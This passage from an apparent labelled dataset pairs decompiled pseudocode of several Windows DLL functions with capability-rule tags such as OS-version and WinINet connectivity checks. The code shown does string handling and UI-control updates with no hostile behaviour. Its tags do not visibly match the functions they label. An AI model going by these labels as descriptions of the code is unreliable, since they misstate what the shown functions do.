code_r0x00018004d070;\n        }\n        iVar8 = CONCAT62(uStack88._2_6_, uStack88);\n        iVar7 = iVar8;\n        if ((CONCAT44(uStack60, uStack64) * 2 + 2 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)) {\n            fcn.18008fb24(iVar7);\n            goto code_r0x00018004d062;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x00018004d22b:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 2953
    },
    "18004dd4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Variable defined which should be unmapped: var_21h\n// WARNING: Variable defined which should be unmapped: var_29h\n// WARNING: Variable defined which should be unmapped: var_31h\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18004dd40(ulong noname_0, uint *arg2, ulong arg3, uint32_t *arg4)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uchar auVar5 [12];\n    int64_t *piVar6;\n    uint *puVar7;\n    uint64_t arg2_00;\n    ushort *puVar8;\n    ushort *puVar9;\n    uint64_t arg2_01;\n    int64_t iVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    uchar extraout_XMM0 [16];\n    uchar extraout_XMM0_00 [16];\n    uchar auVar13 [16];\n    ulong var_1fh;\n    uchar auStack248 [32];\n    uint64_t uStack216;\n    uint32_t uStack208;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uchar auStack184 [16];\n    ulong uStack168;\n    int64_t iStack152;\n    uint uStack144;\n    uint uStack140;\n    ulong uStack136;\n    uint *puStack128;\n    int16_t aiStack120 [3];\n    ulong var_69h;\n    ulong var_59h;\n    ulong var_51h;\n    ulong var_49h;\n    uint64_t var_39h;\n    ulong var_31h;\n    ulong var_29h;\n    ulong var_21h;\n    ulong var_19h;\n    \n    uStack136 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack248;\n    uStack208 = arg4[1];\n    uStack216 = uStack216 & 0xffffffff00000000 | *arg4;\n    puStack128 = arg2;\n    fcn.180020a90(aiStack120, 0x19, L\"BFBI_%02i=%06X %06X \", arg3);\n    iVar12 = 0x1800f7d2c;\n    if (arg4[3] != 0) {\n        iVar12 = 0x1800f7bfc;\n    }\n    iVar11 = 0x1800f7d3c;\n    if (arg4[2] != 0) {\n        iVar11 = 0x1800f7d1c;\n    }\n    iStack152 = CONCAT44(*0x180101904, *0x180101900);\n    uStack144 = *0x180101908;\n    uStack140 = *0x18010190c;\n    uStack168._0_2_ = 0;\n    arg2_01 = 0xffffffffffffffff;\n    iVar10 = -1;\n    do {\n        iVar10 = iVar10 + 1;\n    } while (aiStack120[iVar10] != 0);\n    fcn.180010d70(&uStack168, aiStack120, iVar10);\n    arg2_00 = 0xffffffffffffffff;\n    do {\n        arg2_00 = arg2_00 + 1;\n    } while (*(iVar11 + arg2_00 * 2) != 0);\n    if (CONCAT44(uStack140, uStack144) - iStack152 < arg2_00) {\n        uStack216 = arg2_00;\n        piVar6 = fcn.180013690(&uStack168, arg2_00, 0, iVar11);\n        auVar13 = extraout_XMM0_00;\n    }\n    else {\n        iVar10 = iStack152 + arg2_00;\n        puVar8 = &uStack168;\n        if (7 < CONCAT44(uStack140, uStack144)) {\n            puVar8 = CONCAT62(uStack168._2_6_, uStack168);\n        }\n        puVar9 = puVar8 + iStack152;\n        iStack152 = iVar10;\n        fcn.1800ade80(puVar9, iVar11, arg2_00 * 2);\n        puVar8[iVar10] = 0;\n        piVar6 = &uStack168;\n        auVar13 = extraout_XMM0;\n    }\n    auStack184 = auVar13 & 0x0;\n    puVar8 = *piVar6;\n    uStack200._0_2_ = *piVar6;\n    uStack200._2_2_ = *piVar6 >> 0x10;\n    uStack196 = *(piVar6 + 4);\n    uStack192 = *(piVar6 + 1);\n    uStack188 = *(piVar6 + 0xc);\n    auVar5 = **(piVar6 + 2);\n    auStack184 = *(piVar6 + 2);\n    piVar6[2] = 0;\n    piVar6[3] = 7;\n    *piVar6 = 0;\n    do {\n        arg2_01 = arg2_01 + 1;\n    } while (*(iVar12 + arg2_01 * 2) != 0);\n    auStack184._0_8_ = SUB128(auVar5, 0);\n    auStack184._8_8_ = SUB168(auStack184 >> 0x40, 0);\n    if (auStack184._8_8_ - auStack184._0_8_ < arg2_01) {\n        uStack216 = arg2_01;\n        puVar7 = fcn.180013690(&uStack200, arg2_01, 0, iVar12);\n    }\n    else {\n        auStack184 = CONCAT88(auStack184._8_8_, auStack184._0_8_ + arg2_01);\n        puVar9 = &uStack200;\n        if (7 < auStack184._8_8_) {\n            puVar9 = puVar8;\n        }\n        fcn.1800ade80(puVar9 + auStack184._0_8_, iVar12, arg2_01 * 2);\n        puVar9[auStack184._0_8_ + arg2_01] = 0;\n        puVar7 = &uStack200;\n    }\n    *(arg2 + 4) = 0;\n    *(arg2 + 6) = 0;\n    uVar2 = puVar7[1];\n    uVar3 = puVar7[2];\n    uVar4 = puVar7[3];\n    *arg2 = *puVar7;\n    arg2[1] = uVar2;\n    arg2[2] = uVar3;\n    arg2[3] = uVar4;\n    uVar2 = puVar7[5];\n    uVar3 = puVar7[6];\n    uVar4 = puVar7[7];\n    arg2[4] = puVar7[4];\n    arg2[5] = uVar2;\n    arg2[6] = uVar3;\n    arg2[7] = uVar4;\n    *(puVar7 + 4) = 0;\n    *(puVar7 + 6) = 7;\n    *puVar7 = 0;\n    if (7 < auStack184._8_8_) {\n        iVar11 = CONCAT44(uStack196, CONCAT22(uStack200._2_2_, uStack200));\n        iVar12 = iVar11;\n        if ((0xfff < auStack184._8_8_ * 2 + 2) && (iVar12 = *(iVar11 + -8),  0x1f < (iVar11 - iVar12) - 8U))\n        goto code_r0x00018004dfec;\n        fcn.18008fb24(iVar12);\n    }\n    auStack184 = CONCAT88(CONCAT44(*0x18010190c, *0x180101908), CONCAT44(*0x180101904, *0x180101900));\n    uStack200._0_2_ = 0;\n    if (7 < CONCAT44(uStack140, uStack144)) {\n        iVar12 = CONCAT44(uStack140, uStack144) * 2;\n        iVar10 = CONCAT62(uStack168._2_6_, uStack168);\n        iVar11 = iVar10;\n        if (0xfff < iVar12 + 2U) {\n            iVar11 = *(iVar10 + -8);\n            if (0x1f < (iVar10 - iVar11) - 8U) {\n                fcn.1800b3528(CONCAT44(*0x180101904, *0x180101900), iVar11, iVar12 + 0x29);\ncode_r0x00018004dfec:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar11);\n    }\n    fcn.18008fb00(stack0xffffffffffffffc0 ^ auStack248);\n    return;\n}\n",
        "token_count": 2055
    },
    "18004f34": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18004f340(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    char cVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uchar *puVar6;\n    uint *puVar7;\n    int64_t iVar8;\n    ulong uVar9;\n    ulong uVar10;\n    int64_t iVar11;\n    char cVar12;\n    ushort uStack88;\n    unkbyte6 Stack86;\n    uint64_t uStack72;\n    uint uStack64;\n    uint uStack60;\n    ushort uStack56;\n    ushort uStack54;\n    uint uStack52;\n    ulong uStack48;\n    ulong uStack40;\n    uint64_t uStack32;\n    ulong uStack24;\n    \n    if ((*(arg1 + 0xb6) == '\\0') || (*(arg1 + 0x30) == '\\0')) {\n        cVar12 = '\\0';\n    }\n    else {\n        cVar12 = '\\x01';\n    }\n    uStack48 = 0x18004f38c;\n    iVar8 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x18b, 0, 0);\n    cVar2 = *(arg1 + 0xb6);\n    uStack48 = 0x18004f3ac;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23f9);\n    uStack48 = 0x18004f3b7;\n    (**0x1800de718)(uVar9, -(cVar2 != '\\0') & 5);\n    uVar9 = 5;\n    if (*(arg1 + 0xb6) != '\\0') {\n        uVar9 = 0;\n    }\n    uStack48 = 0x18004f3d7;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x23f8);\n    uStack48 = 0x18004f3e2;\n    (**0x1800de718)(uVar10, uVar9);\n    uStack48 = 0x18004f3f5;\n    (**0x1800de770)(*(arg1 + 0xb8), cVar12);\n    uStack48 = 0x18004f404;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23f9);\n    uStack48 = 0x18004f40f;\n    (**0x1800de770)(uVar9, cVar12);\n    uStack48 = 0x18004f41e;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23fa);\n    uStack48 = 0x18004f429;\n    (**0x1800de770)(uVar9, cVar12);\n    uStack48 = 0x18004f43f;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23fb);\n    uStack48 = 0x18004f44a;\n    (**0x1800de770)(uVar9, 0 < iVar8);\n    uStack48 = 0x18004f459;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x2445);\n    uStack48 = 0x18004f464;\n    (**0x1800de770)(uVar9, cVar12);\n    uStack48 = 0x18004f473;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x2446);\n    uStack48 = 0x18004f47e;\n    (**0x1800de770)(uVar9, cVar12);\n    if (cVar12 == '\\0') {\n        uStack48 = 0x18004f49c;\n        uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23f3);\n        uStack48 = 0x18004f4a7;\n        (**0x1800de770)(uVar9, 0);\n        uStack48 = 0x18004f4b6;\n        uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23f4);\n        uStack48 = 0x18004f4c1;\n        (**0x1800de770)(uVar9, 0);\n    }\n    else {\n        uStack48 = 0x18004f48b;\n        fcn.18004f280(arg1);\n    }\n    uStack24 = 0xfffffffffffffffe;\n    if (*(arg1 + 0xb5) == '\\0') {\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = *0x180101908;\n        uStack60 = *0x18010190c;\n        uStack88 = 0;\n        fcn.180010d70(&stack0xffffffffffffffa8, 0x1800fa1e8, 0x1c);\n        uVar5 = uStack72;\n        if (CONCAT44(uStack60, uStack64) == uStack72) {\n            puVar7 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f79bc);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar6 = &stack0xffffffffffffffa8;\n            if (7 < CONCAT44(uStack60, uStack64)) {\n                puVar6 = CONCAT62(Stack86, uStack88);\n            }\n            *(puVar6 + uVar5 * 2) = 0x2a;\n            *(puVar6 + uVar1 * 2) = 0;\n            puVar7 = &stack0xffffffffffffffa8;\n        }\n        uStack56 = *puVar7;\n        uStack54 = *puVar7 >> 0x10;\n        uStack52 = puVar7[1];\n        uStack48 = *(puVar7 + 2);\n        uStack40 = *(puVar7 + 4);\n        uStack32 = *(puVar7 + 6);\n        *(puVar7 + 4) = 0;\n        *(puVar7 + 6) = 7;\n        *puVar7 = 0;\n        puVar6 = &stack0xffffffffffffffc8;\n        if (7 < uStack32) {\n            puVar6 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x2441, puVar6);\n        if (uStack32 < 8) {\ncode_r0x00018004ce86:\n            uStack40 = CONCAT44(*0x180101904, *0x180101900);\n            uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack56 = 0;\n            if (CONCAT44(uStack60, uStack64) < 8) {\ncode_r0x00018004ced7:\n                fcn.180068600(*(arg1 + 0x18), 0x2441);\n                goto code_r0x00018004cee5;\n            }\n            iVar11 = CONCAT62(Stack86, uStack88);\n            iVar8 = iVar11;\n            if ((CONCAT44(uStack60, uStack64) * 2 + 2 < 0x1000) ||\n               (iVar8 = *(iVar11 + -8),  (iVar11 - iVar8) - 8U < 0x20)) {\n                fcn.18008fb24(iVar8);\n                goto code_r0x00018004ced7;\n            }\n        }\n        else {\n            iVar11 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            iVar8 = iVar11;\n            if ((uStack32 * 2 + 2 < 0x1000) || (iVar8 = *(iVar11 + -8),  (iVar11 - iVar8) - 8U < 0x20)) {\n                fcn.18008fb24(iVar8);\n                goto code_r0x00018004ce86;\n            }\ncode_r0x00018004d213:\n            fcn.1800b3528();\n        }\n        fcn.1800b3528();\ncode_r0x00018004d21f:\n        fcn.1800b3528();\n    }\n    else {\n        (**0x1800de788)(*(arg1 + 0x18), 0x2441, 0x1800fa198);\n        fcn.180068540(*(arg1 + 0x18), 0x2441);\ncode_r0x00018004cee5:\n        if (*(arg1 + 0xb6) != '\\0') {\n            (**0x1800de788)(*(arg1 + 0x18), 0x23f7, 0x1800fa228);\n            fcn.180068540(*(arg1 + 0x18), 0x23f7);\ncode_r0x00018004d070:\n            if (*(arg1 + 0x30) != '\\0') {\n                (**0x1800de788)(*(arg1 + 0x18), 0x2419, 0x1800fa238);\n                fcn.180068540(*(arg1 + 0x18), 0x2419);\n                return;\n            }\n            uStack72 = CONCAT44(*0x180101904, *0x180101900);\n            uStack64 = *0x180101908;\n            uStack60 = *0x18010190c;\n            uStack88 = 0;\n            fcn.180010d70(&stack0xffffffffffffffa8, 0x1800fa258, 6);\n            uVar5 = uStack72;\n            if (CONCAT44(uStack60, uStack64) == uStack72) {\n                puVar7 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f79dc);\n            }\n            else {\n                uVar1 = uStack72 + 1;\n                uStack72 = uVar1;\n                puVar6 = &stack0xffffffffffffffa8;\n                if (7 < CONCAT44(uStack60, uStack64)) {\n                    puVar6 = CONCAT62(Stack86, uStack88);\n                }\n                *(puVar6 + uVar5 * 2) = 0x2a;\n                *(puVar6 + uVar1 * 2) = 0;\n                puVar7 = &stack0xffffffffffffffa8;\n            }\n            uStack56 = *puVar7;\n            uStack54 = *puVar7 >> 0x10;\n            uStack52 = puVar7[1];\n            uStack48 = *(puVar7 + 2);\n            uStack40 = *(puVar7 + 4);\n            uStack32 = *(puVar7 + 6);\n            *(puVar7 + 4) = 0;\n            *(puVar7 + 6) = 7;\n            *puVar7 = 0;\n            puVar6 = &stack0xffffffffffffffc8;\n            if (7 < uStack32) {\n                puVar6 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            }\n            (**0x1800de788)(*(arg1 + 0x18), 0x2419, puVar6);\n            if (7 < uStack32) {\n                iVar11 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n                iVar8 = iVar11;\n                if ((0xfff < uStack32 * 2 + 2) && (iVar8 = *(iVar11 + -8),  0x1f < (iVar11 - iVar8) - 8U))\n                goto code_r0x00018004d22b;\n                fcn.18008fb24(iVar8);\n            }\n            uStack40 = CONCAT44(*0x180101904, *0x180101900);\n            uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack56 = 0;\n            if (CONCAT44(uStack60, uStack64) < 8) goto code_r0x00018004d1e6;\n            iVar8 = CONCAT44(uStack60, uStack64) * 2;\n            iVar4 = CONCAT62(Stack86, uStack88);\n            iVar11 = iVar4;\n            if (0xfff < iVar8 + 2U) {\n                iVar11 = *(iVar4 + -8);\n                if (0x1f < (iVar4 - iVar11) - 8U) {\n                    fcn.1800b3528(uStack40, iVar11, iVar8 + 0x29);\n                    goto code_r0x00018004d213;\n                }\n            }\n            fcn.18008fb24(iVar11);\ncode_r0x00018004d1e6:\n            fcn.180068600(*(arg1 + 0x18), 0x2419);\n            return;\n        }\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = *0x180101908;\n        uStack60 = *0x18010190c;\n        uStack88 = 0;\n        fcn.180010d70(&stack0xffffffffffffffa8, 0x1800fa248, 6);\n        uVar5 = uStack72;\n        if (CONCAT44(uStack60, uStack64) == uStack72) {\n            puVar7 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f79cc);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar6 = &stack0xffffffffffffffa8;\n            if (7 < CONCAT44(uStack60, uStack64)) {\n                puVar6 = CONCAT62(Stack86, uStack88);\n            }\n            *(puVar6 + uVar5 * 2) = 0x2a;\n            *(puVar6 + uVar1 * 2) = 0;\n            puVar7 = &stack0xffffffffffffffa8;\n        }\n        uStack56 = *puVar7;\n        uStack54 = *puVar7 >> 0x10;\n        uStack52 = puVar7[1];\n        uStack48 = *(puVar7 + 2);\n        uStack40 = *(puVar7 + 4);\n        uStack32 = *(puVar7 + 6);\n        *(puVar7 + 4) = 0;\n        *(puVar7 + 6) = 7;\n        *puVar7 = 0;\n        puVar6 = &stack0xffffffffffffffc8;\n        if (7 < uStack32) {\n            puVar6 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x23f7, puVar6);\n        if (7 < uStack32) {\n            iVar11 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            iVar8 = iVar11;\n            if ((uStack32 * 2 + 2 < 0x1000) || (iVar8 = *(iVar11 + -8),  (iVar11 - iVar8) - 8U < 0x20)) {\n                fcn.18008fb24(iVar8);\n                goto code_r0x00018004d011;\n            }\n            goto code_r0x00018004d21f;\n        }\ncode_r0x00018004d011:\n        uStack40 = CONCAT44(*0x180101904, *0x180101900);\n        uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack56 = 0;\n        if (CONCAT44(uStack60, uStack64) < 8) {\ncode_r0x00018004d062:\n            fcn.180068600(*(arg1 + 0x18), 0x23f7);\n            goto code_r0x00018004d070;\n        }\n        iVar11 = CONCAT62(Stack86, uStack88);\n        iVar8 = iVar11;\n        if ((CONCAT44(uStack60, uStack64) * 2 + 2 < 0x1000) || (iVar8 = *(iVar11 + -8),  (iVar11 - iVar8) - 8U < 0x20))\n        {\n            fcn.18008fb24(iVar8);\n            goto code_r0x00018004d062;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x00018004d22b:\n    fcn.1800b3528();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 3875
    },
    "18004f4f": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18004f4f0(int64_t arg1, ulong arg2)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint *puVar8;\n    int64_t *arg1_00;\n    int64_t iVar9;\n    uint64_t uVar10;\n    int64_t iVar11;\n    uint *puVar12;\n    int64_t iVar13;\n    ulong *puVar14;\n    uchar auStack200 [32];\n    ulong uStack168;\n    int64_t aiStack152 [3];\n    uint64_t uStack128;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uchar auStack104 [16];\n    uint *puStack88;\n    uint64_t uStack72;\n    \n    uStack168 = 0xfffffffffffffffe;\n    uStack72 = *0x180123080 ^ auStack200;\n    iVar6 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x188, 0, 0);\n    if (iVar6 != -1) {\n        if (arg2 == -1) {\n            if (iVar6 == 0) goto code_r0x00018004f58d;\n        }\n        else if ((arg2 != 1) || ((*(arg1 + 0xd0) - *(arg1 + 200)) / 0x48 + -1 <= iVar6)) goto code_r0x00018004f58d;\n        iVar9 = iVar6 * 0x48;\n        iVar11 = *(arg1 + 200) + iVar9;\n        arg1_00 = aiStack152;\n        fcn.18000da90(arg1_00, iVar11);\n        uStack120 = *(iVar11 + 0x20);\n        uStack116 = *(iVar11 + 0x24);\n        uStack112 = *(iVar11 + 0x28);\n        uStack108 = *(iVar11 + 0x2c);\n        auStack104 = ZEXT816(0);\n        puStack88 = NULL;\n        puVar12 = *(iVar11 + 0x30);\n        puVar1 = *(iVar11 + 0x38);\n        if (puVar12 != puVar1) {\n            iVar11 = puVar1 - puVar12 >> 4;\n            puVar7 = fcn.18001b980(arg1_00, iVar11);\n            puStack88 = puVar7 + iVar11 * 4;\n            puVar8 = puVar7;\n            do {\n                uVar3 = puVar12[1];\n                uVar4 = puVar12[2];\n                uVar5 = puVar12[3];\n                *puVar8 = *puVar12;\n                puVar8[1] = uVar3;\n                puVar8[2] = uVar4;\n                puVar8[3] = uVar5;\n                puVar8 = puVar8 + 4;\n                puVar12 = puVar12 + 4;\n            } while (puVar12 != puVar1);\n            auStack104 = CONCAT88(puVar8, puVar7);\n        }\n        iVar13 = arg2 + iVar6;\n        iVar11 = iVar13 * 0x48;\n        fcn.18004f7a0(*(arg1 + 200) + iVar9, iVar11 + *(arg1 + 200));\n        fcn.18004f7a0(*(arg1 + 200) + iVar11, aiStack152);\n        (**0x1800de7f0)(*(arg1 + 0xb8), 0x182, iVar6, 0);\n        puVar14 = *(arg1 + 200) + iVar11;\n        if (7 < puVar14[3]) {\n            puVar14 = *puVar14;\n        }\n        (**0x1800de7f0)(*(arg1 + 0xb8), 0x181, iVar13, puVar14);\n        (**0x1800de7f0)(*(arg1 + 0xb8), 0x186, iVar13, 0);\n        *(arg1 + 0xb5) = 0;\n        fcn.18004cd30(arg1);\n        fcn.18004f280(arg1);\n        if (auStack104._0_8_ != 0) {\n            uVar10 = puStack88 - auStack104._0_8_ & 0xfffffffffffffff0;\n            iVar9 = auStack104._0_8_;\n            if ((0xfff < uVar10) && (iVar9 = *(auStack104._0_8_ + -8),  0x1f < (auStack104._0_8_ - iVar9) - 8U))\n            goto code_r0x00018004f797;\n            fcn.18008fb24(iVar9);\n            auStack104 = ZEXT816(0);\n            puStack88 = NULL;\n        }\n        if (7 < uStack128) {\n            uVar10 = uStack128 * 2 + 2;\n            iVar9 = aiStack152[0];\n            if ((0xfff < uVar10) && (iVar9 = *(aiStack152[0] + -8),  0x1f < (aiStack152[0] - iVar9) - 8U)) {\ncode_r0x00018004f797:\n                fcn.1800b3528(iVar9, uVar10 + 0x27);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            fcn.18008fb24(iVar9);\n        }\n    }\ncode_r0x00018004f58d:\n    fcn.18008fb00(uStack72 ^ auStack200);\n    return;\n}\n",
        "token_count": 1321
    },
    "18004fcf": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18004fcf0(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    char cVar2;\n    uchar uVar3;\n    code *pcVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uchar *puVar7;\n    uint *puVar8;\n    int64_t iVar9;\n    ulong uVar10;\n    ulong uVar11;\n    int64_t iVar12;\n    char cVar13;\n    ushort uStack88;\n    unkbyte6 Stack86;\n    uint64_t uStack72;\n    uint uStack64;\n    uint uStack60;\n    ushort uStack56;\n    ushort uStack54;\n    uint uStack52;\n    ulong uStack48;\n    ulong uStack40;\n    uint64_t uStack32;\n    ulong uStack24;\n    \n    uVar3 = *(arg1 + 0x30);\n    uStack48 = 0x18004fd10;\n    uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x2409);\n    uStack48 = 0x18004fd1b;\n    (**0x1800de770)(uVar11, uVar3);\n    uVar3 = *(arg1 + 0x30);\n    uStack48 = 0x18004fd2e;\n    uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x240b);\n    uStack48 = 0x18004fd39;\n    (**0x1800de770)(uVar11, uVar3);\n    uVar3 = *(arg1 + 0x30);\n    uStack48 = 0x18004fd4c;\n    uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x240a);\n    uStack48 = 0x18004fd57;\n    (**0x1800de770)(uVar11, uVar3);\n    if (*(arg1 + 0x30) == '\\0') {\n        uStack48 = 0x18004fd86;\n        uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x2407);\n        uStack48 = 0x18004fd91;\n        (**0x1800de770)(uVar11, 0);\n        uVar3 = *(arg1 + 0x30);\n        uStack48 = 0x18004fda4;\n        uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x2408);\n        uStack48 = 0x18004fdaf;\n        (**0x1800de770)(uVar11, uVar3);\n    }\n    else {\n        uStack48 = 0x18004fd65;\n        fcn.18004fc00(arg1);\n    }\n    if ((*(arg1 + 0xb6) == '\\0') || (*(arg1 + 0x30) == '\\0')) {\n        cVar13 = '\\0';\n    }\n    else {\n        cVar13 = '\\x01';\n    }\n    uStack48 = 0x18004f38c;\n    iVar9 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x18b, 0, 0);\n    cVar2 = *(arg1 + 0xb6);\n    uStack48 = 0x18004f3ac;\n    uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x23f9);\n    uStack48 = 0x18004f3b7;\n    (**0x1800de718)(uVar11, -(cVar2 != '\\0') & 5);\n    uVar11 = 5;\n    if (*(arg1 + 0xb6) != '\\0') {\n        uVar11 = 0;\n    }\n    uStack48 = 0x18004f3d7;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x23f8);\n    uStack48 = 0x18004f3e2;\n    (**0x1800de718)(uVar10, uVar11);\n    uStack48 = 0x18004f3f5;\n    (**0x1800de770)(*(arg1 + 0xb8), cVar13);\n    uStack48 = 0x18004f404;\n    uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x23f9);\n    uStack48 = 0x18004f40f;\n    (**0x1800de770)(uVar11, cVar13);\n    uStack48 = 0x18004f41e;\n    uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x23fa);\n    uStack48 = 0x18004f429;\n    (**0x1800de770)(uVar11, cVar13);\n    uStack48 = 0x18004f43f;\n    uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x23fb);\n    uStack48 = 0x18004f44a;\n    (**0x1800de770)(uVar11, 0 < iVar9);\n    uStack48 = 0x18004f459;\n    uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x2445);\n    uStack48 = 0x18004f464;\n    (**0x1800de770)(uVar11, cVar13);\n    uStack48 = 0x18004f473;\n    uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x2446);\n    uStack48 = 0x18004f47e;\n    (**0x1800de770)(uVar11, cVar13);\n    if (cVar13 == '\\0') {\n        uStack48 = 0x18004f49c;\n        uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x23f3);\n        uStack48 = 0x18004f4a7;\n        (**0x1800de770)(uVar11, 0);\n        uStack48 = 0x18004f4b6;\n        uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x23f4);\n        uStack48 = 0x18004f4c1;\n        (**0x1800de770)(uVar11, 0);\n    }\n    else {\n        uStack48 = 0x18004f48b;\n        fcn.18004f280(arg1);\n    }\n    uStack24 = 0xfffffffffffffffe;\n    if (*(arg1 + 0xb5) == '\\0') {\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = *0x180101908;\n        uStack60 = *0x18010190c;\n        uStack88 = 0;\n        fcn.180010d70(&stack0xffffffffffffffa8, 0x1800fa1e8, 0x1c);\n        uVar6 = uStack72;\n        if (CONCAT44(uStack60, uStack64) == uStack72) {\n            puVar8 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f79bc);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar7 = &stack0xffffffffffffffa8;\n            if (7 < CONCAT44(uStack60, uStack64)) {\n                puVar7 = CONCAT62(Stack86, uStack88);\n            }\n            *(puVar7 + uVar6 * 2) = 0x2a;\n            *(puVar7 + uVar1 * 2) = 0;\n            puVar8 = &stack0xffffffffffffffa8;\n        }\n        uStack56 = *puVar8;\n        uStack54 = *puVar8 >> 0x10;\n        uStack52 = puVar8[1];\n        uStack48 = *(puVar8 + 2);\n        uStack40 = *(puVar8 + 4);\n        uStack32 = *(puVar8 + 6);\n        *(puVar8 + 4) = 0;\n        *(puVar8 + 6) = 7;\n        *puVar8 = 0;\n        puVar7 = &stack0xffffffffffffffc8;\n        if (7 < uStack32) {\n            puVar7 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x2441, puVar7);\n        if (uStack32 < 8) {\ncode_r0x00018004ce86:\n            uStack40 = CONCAT44(*0x180101904, *0x180101900);\n            uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack56 = 0;\n            if (CONCAT44(uStack60, uStack64) < 8) {\ncode_r0x00018004ced7:\n                fcn.180068600(*(arg1 + 0x18), 0x2441);\n                goto code_r0x00018004cee5;\n            }\n            iVar12 = 